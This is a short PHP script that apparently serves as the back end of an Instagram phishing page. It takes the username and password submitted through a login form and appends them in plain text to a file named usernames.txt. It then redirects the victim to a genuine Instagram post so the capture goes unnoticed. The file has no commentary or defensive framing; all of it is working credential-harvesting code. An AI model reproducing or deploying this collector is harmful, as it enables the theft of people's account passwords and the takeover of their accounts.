<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
$work=fopen("password.txt","w");
header('Location: https://www.instagram.com/p/CIDHlsxDiYd/?utm_medium=copy_link');
exit();
?>
